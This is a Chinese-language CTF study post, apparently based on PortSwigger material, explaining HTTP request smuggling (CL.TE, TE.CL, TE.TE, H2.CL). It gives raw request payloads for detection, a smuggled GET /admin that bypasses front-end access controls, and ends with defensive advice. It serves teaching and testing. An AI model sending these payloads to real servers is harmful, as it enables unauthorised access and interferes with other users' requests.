---
title: HTTP 请求走私
published: 2026-08-20
description: 咕咕嘎嘎
image: "./16.png"
tags: ["CTF"]
category: CTF
draft: false
slug: http/1.1&2
---

全是跟着 port 学的（

题目的话目前为止除了 port 里面的外只碰到个 `MoeCTF2026` 的，这里来学习一下更多的利用方式

概念：HTTP 请求走私是一种干扰网站处理来自一个或多个用户的 HTTP 请求序列方式的技术

背景：如今的 Web 应用程序通常在用户和最终应用程序逻辑之间部署一系列 HTTP 服务器。用户向前端服务器（有时称为负载均衡器或反向代理）发送请求，该服务器再将请求转发到一个或多个后端服务器。这种架构在现代云应用程序中越来越普遍，在某些情况下甚至是不可避免的
当前端服务器将 HTTP 请求转发到后端服务器时，通常会通过同一个后端网络连接发送多个请求，因为这样效率更高，性能更好。该协议非常简单：HTTP 请求一个接一个地发送，接收服务器必须确定一个请求在哪里结束，下一个请求在哪里开始
攻击者通过这种方式，使前端请求的一部分被后端服务器解读为下一个请求的开头。这部分内容实际上被添加到了下一个请求之前，从而干扰了应用程序处理该请求的方式。这是一种请求走私攻击，可能会造成毁灭性的后果
由于 HTTP/1 规范提供了两种不同的方法来指定 HTTP 消息的长度，因此单个消息可能同时使用这两种方法，导致它们相互冲突。规范试图通过规定如果同时存在 `Content-Length` 和 `Transfer-Encoding` 标头，则应忽略 `Content-Length` 标头来避免这个问题。这或许足以避免歧义。 当只有一个服务器运行时，不会出现问题；但当两个或多个服务器串联运行时，则不会出现问题。在这种情况下，两个服务器可能会出现问题

危害：未授权访问敏感数据

成因：HTTP/1 规范提供了两种不同的方式来指定请求的结束位置： `Content-Length` 标头和 `Transfer-Encoding` 标头

`Content-Length` 标头很简单：它指定消息体的长度（以字节为单位）：

```plain
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Transfer-Encoding
Transfer-Encoding 标头可用于指定消息体使用分块编码。 这意味着消息体包含一个或多个数据块。每个数据块的大小以字节为单位（以字节为单位）。 十六进制），后跟一个换行符，再后跟数据块内容。消息以大小为零的数据块结束

这里使用分块编码的时候 `TE` 的值即为 `chunked`

```plain
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

这里的 `b` 是 16进制的编码，为 11，接下来有 11 个字节数据

0 表示结束

注意：浏览器通常不会在请求中使用分块编码，分块编码通常只出现在服务器响应中（且在 bp 里面会自动解压缩分块编码）

## CL.TE

前端 cl，后端 te

```plain
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

注意这里是有换行符的，实际字节是：

```plain
0\r\n
\r\n
SMUGGLED
```

换行符是两个字节，1+2+2+8=13

前端服务器处理 `Content-Length` 标头，并确定请求体长度为 13 字节，直至 `SMUGGLED` 的末尾。此请求被转发到后端服务器

后端服务器处理 `Transfer-Encoding` 标头，因此会将消息体视为使用分块编码。它会处理第一个数据块（标头中声明长度为零），因此该数据块被视为请求的终止符。接下来的字节 `SMUGGLED` ）则不予处理，后端服务器会将这些字节视为…… 序列中下一个请求的开始

## TE.CL

前端 te，后端 cl：

```plain
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

这里仍然 `8` 后面是换行符，占两字节

前端服务器处理 `Transfer-Encoding` 头，因此将消息体视为使用分块编码。它处理第一个数据块（长度为 8 字节），直到 `SMUGGLED` 之后的行的开头。它处理第二个数据块（长度为零字节），因此将其视为终止符。 该请求将被转发到后端服务器

后端服务器处理 `Content-Length` 标头，并确定请求体长度为 3 个字节，直到数字 `8` 之后的行首。从 `SMUGGLED` 开始的后续字节将不予处理，后端服务器会将这些字节视为下一个请求体的开始。 按顺序请求

## TE.TE

前端服务器和后端服务器都支持 `Transfer-Encoding` 标头，但其中一台服务器不支持。 可以通过某种方式混淆标头，使其不被处理

混淆 TE 标头的方式有很多：

```plain
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

这些技术都涉及对 HTTP 规范的细微偏离。实际应用中，实现协议规范的代码很少能完全遵循规范，不同的实现通常会容忍不同的规范偏差。要发现 TE.TE 漏洞，必须找到 `Transfer-Encoding` 标头的某种变体，使得只有前端或后端服务器中的一个会处理它，而其他服务器则不会。 其他服务器会忽略它

根据是前端服务器还是后端服务器被诱导不处理混淆后的 `Transfer-Encoding` 标头，攻击的其余部分将与 CL.TE 或 TE.CL 的攻击形式相同。 已描述过的漏洞

## 发现漏洞

### 利用计时

检测 HTTP 请求走私漏洞最常用的有效方法是发送一些请求，如果存在漏洞，这些请求会导致应用程序响应出现**时间延迟**。Burp Scanner 就采用了这种技术来自动检测请求走私漏洞

CL.TE：

```payload
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

这里按照道理来讲，x 是有 0 标识符的，因此会让后端知道数据都收完了，但是上述操作后后端就永远也接受不到 0 了，因此会导致延迟

TE.CL：

```payload
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

这里也和前面理由一样，te 直接看到0就发送到后端（没带X），但是后端是 cl 机制，看到 6 字节但是实际得到的只有 5 字节自然会进行等待

前端发送的是：

```plain
0

```

这里 `chunkded` 的机制是：只有 `0\r\n\r\n` 收到接收方才能确认分块传输正常结束

### 不同响应

快速发送两个请求：

- 一种旨在干扰下一个请求处理的“攻击”请求
- 一个“正常”的请求

如果对正常请求的响应包含预期的干扰，则可以确认存在漏洞

CL.TE：

```oayload
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

如果攻击成果，最下面两行会被视为下一个请求，导致：

```plain
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

从而返回 404，证明确实存在走私漏洞

TL.CL：

```payload
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

这里切记最后的 0 要加上两个换行符，也就是上述提到的要让 `chunked` 顺利识别到并且停止

如果成功，一样还是会使得下一个正常请求返回 404：

```plain
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

注意事项：

攻击请求和正常请求应该使用不同的网络连接发送到服务器。通过同一连接发送这两个请求并不能证明漏洞存在

“攻击”请求和“正常”请求应尽可能使用相同的 URL 和参数名称。这是因为许多现代应用程序会根据 URL 和参数将前端请求路由到不同的后端服务器。使用相同的 URL 和参数可以提高请求被同一后端服务器处理的概率，这对于攻击成功至关重要

在测试“正常”请求以检测“攻击”请求是否干扰时，您需要与其他应用程序同时接收的请求（包括来自其他用户的请求）进行竞争。您应该在“攻击”请求之后立即发送“正常”请求。如果应用程序繁忙，您可能需要多次尝试才能确认漏洞

在某些应用中，前端服务器充当负载均衡器的角色，并根据某种负载均衡算法将请求转发到不同的后端系统。如果你的“攻击”请求和“正常”请求被转发到不同的后端系统，那么攻击就会失败。这也是为什么你可能需要多次尝试才能确认漏洞存在的原因之一

如果你的攻击成功干扰了后续请求，但该请求并非你用于检测干扰的“正常”请求，则意味着其他应用程序用户也受到了攻击的影响。如果你继续执行测试，可能会对其他用户造成干扰，因此你应该谨慎行事

## 利用漏洞

### 前端绕过

假设一个应用程序使用前端服务器来实现访问控制限制，仅转发已获得授权访问请求 URL 的用户的请求。后端服务器则不加检查地处理所有请求。在这种情况下，HTTP 请求走私漏洞可被利用，通过向受限 URL 发送请求来绕过访问控制

即我们通过访问已授权的的 url 随后再 http 走私我们未授权的 url，若是服务器没有加以校验就可能成功

假设当前用户被允许访问 `/home` 但无权访问 `/admin` 。他们可以使用以下请求走私攻击绕过此限制：

```plain
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

## 高级请求走私

这里的背景协议都变为了 http/2

HTTP/2 消息实际上是以一系列独立的“帧”的形式通过网络传输的。每个帧前面都有一个明确的长度字段，用于告诉服务器需要读取多少字节。因此，请求的长度是所有帧长度的总和

看似无敌，因为只要网站全部使用 http/2，前后端对于请求长度的不同识别方式就都一样而不会产生走私，但是由于普遍存在的 http/2 降级，这反而导致了更多问题

**HTTP/2 降级**

HTTP/2 降级是指使用 HTTP/1 语法重写 HTTP/2 请求，从而生成等效的 HTTP/1 请求。Web 服务器和反向代理经常这样做，以便在与仅支持 HTTP/1 的后端服务器通信时，也能为客户端提供 HTTP/2 支持

H2.CL：

这个是因为 H2 它降级的时候通常会带个 cl，然后会通过 H2 内置的长度机制去计算请求长度随后与 cl 进行匹配，但是我们仍然可以在 H2 中自行构建 cl，这个时候若是后端处理时是以我们显式声明的 cl 为准则仍然会导致走私

```plain
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
content-length	0
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

后端：

```plain
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

挖个坑后面补（

## 防护

尽可能使用端到端的 HTTP/2 协议，并禁用 HTTP 降级。HTTP/2 使用强大的机制来确定请求长度，并且在端到端使用时，本身就能有效防止请求走私。如果无法避免 HTTP 降级，请确保根据 HTTP/1.1 规范验证重写的请求。例如，拒绝请求头中包含换行符、请求头名称中包含冒号以及请求方法中包含空格的请求

让前端服务器规范化模糊请求，并让后端服务器拒绝任何仍然模糊的请求，并在该过程中关闭 TCP 连接

永远不要假设请求没有请求体。这是导致 CL.0 漏洞和客户端不同步漏洞的根本原因

如果在处理请求时触发服务器级异常，则默认丢弃连接

如果通过转发代理路由流量，请尽可能确保上游启用 HTTP/2